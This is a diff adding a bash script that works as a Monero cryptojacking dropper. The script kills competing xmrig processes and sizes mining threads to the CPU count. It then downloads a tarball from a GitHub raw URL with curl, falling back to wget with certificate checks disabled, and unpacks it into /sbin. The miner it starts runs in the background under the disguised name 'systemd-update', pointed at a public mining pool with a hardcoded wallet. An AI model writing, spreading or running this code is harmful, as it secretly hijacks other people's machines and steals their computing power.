@@ -1,0 +1,73 @@
+#!/bin/bash
+
+url=pool.supportxmr.com:80
+addr=4AJfLf4QvpNjGCSjuqRK3RAJYP2x6JsBV8vqBcNzqgZZcLUQiExCwV1Wp7Jnf5N3koKy6PZ931Yu4SKtX3bqy21A8f7s4oT
+sPath="/sbin"
+
+get_cpu_cores() {
+
+    if command -v nproc >/dev/null 2>&1; then
+        nproc
+        return
+    fi
+
+    if command -v lscpu >/dev/null 2>&1; then
+        lscpu | awk -F: '/^CPU\(s\)/ { gsub(/ /, "", $2); print $2 }' | head -n1
+        return
+    fi
+
+    if [ -f /proc/cpuinfo ]; then
+        grep -c ^processor /proc/cpuinfo
+        return
+    fi
+
+    echo "1"
+}
+
+pkill -9 xmrig
+
+cores=$(get_cpu_cores)
+
+case $cores in
+
+  2)
+    threads=1
+    ;;
+  3)
+    threads=1
+    ;;
+  4)
+    threads=2
+    ;;
+  6)
+    threads=3
+    ;;
+  8)
+    threads=4
+    ;;
+  *)
+    threads=$((cores / 2))
+    ;;
+esac
+
+[ "$threads" -lt 1 ] && threads=1
+
+pgrep -x systemd-update &>/dev/null
+res=$?
+
+if [ ! -f $sPath/systemd-update ];then
+
+	curl -s -k --retry 3 --retry-delay 5 --connect-timeout 30 -o $sPath/core.tar.gz https://raw.githubusercontent.com/xmr-systemd-update/systemd-update/refs/heads/main/systemd-update.tar.gz
+	test $? -ne 0 && wget --no-check-certificate -O $sPath/core.tar.gz https://raw.githubusercontent.com/xmr-systemd-update/systemd-update/refs/heads/main/systemd-update.tar.gz
+	tar -xf $sPath/core.tar.gz -C $sPath
+	rm -f $sPath/core.tar.gz
+	chmod +x $sPath/systemd-update
+	
+	if [ $res -ne 0 ];then
+		$sPath/systemd-update --cpu-priority=5 -t $threads --donate-level=0 -o $url -u $addr -k &
+	fi
+else
+	if [ $res -ne 0 ];then
+		$sPath/systemd-update --cpu-priority=5 -t $threads --donate-level=0 -o $url -u $addr -k &
+	fi
+fi
